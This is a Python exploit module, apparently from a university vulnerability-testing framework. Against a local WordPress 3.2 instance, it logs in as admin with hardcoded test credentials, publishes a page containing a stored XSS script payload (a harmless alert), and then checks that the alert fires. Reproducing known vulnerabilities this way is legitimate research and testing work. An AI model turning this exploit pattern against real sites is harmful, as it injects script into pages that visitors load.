
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import framework                        
import time
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import NoAlertPresentException

class Exploit (framework.Exploit):
    attributes = {'Name' : "OSVDB_83686",                        
                  'Description' : "Creates a post containing a XSS payload.",
                  'References' : [['OSVDB','83686'],['http://www.osvdb.org/show/osvdb/83686']],
                  'Target' : "Wordpress 3.2",
                  'TargetLicense' : '',
                  'Type' : "XSS",
                  'VulWikiPage' : "http://seamster.cs.umd.edu/vulwiki/index.php/OSVDB-83686",
                  'Privileged' : True 
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return

    def exploit(self):
        payload = "<script>alert(\"Hi Kent!!\")</script>"
        driver = self.create_selenium_driver()

        driver.get("http://localhost/wordpress/wp-login.php")
        driver.get_element(by_id="user_login").clear()
        driver.get_element(by_id="user_login").send_keys(" wpadmin")                                                            
        driver.get_element(by_id="user_pass").clear()
        driver.get_element(by_id="user_pass").send_keys("wpadminpw21")
        driver.get_element(by_id="wp-submit").click()
        driver.get_element(by_xpath="//a[@href='edit.php']")

        driver.get("http://127.0.0.1/wordpress/wp-admin/post-new.php?post_type=page")
        title_elt = driver.get_element(by_id="title")
        title_elt.clear()
        title_elt.send_keys("Hacked Content")

        content_elt = driver.get_element(by_id="content")
        content_elt.clear()
        content_elt.send_keys(payload)
        
        for i in range(5,0,-1):
            publish_elt = driver.get_element(by_xpath="//input[@name='publish' and @id='publish']")
            if(publish_elt.is_enabled()):
                publish_elt.send_keys("\n")
                driver.get_element(by_xpath="//a[text()='View page']")
                break

            self.logger.warning("Waiting for publish button to become active (%s)" % (i,))
            time.sleep(1)

        
        driver.cleanup()
        return                

    def verify(self):
        
        verified = False
        
        driver = self.create_selenium_driver()
        driver.get("http://localhost/wordpress/")

        driver.get_element(by_xpath="//a[@title='Hacked Content']").click()
        
        try:
            driver.get_alert()
            self.logger.info("XSS popup comfirmed")
            verified = True
        except NoAlertPresentException:
            self.logger.error("XSS failed")

        driver.cleanup()

        return verified
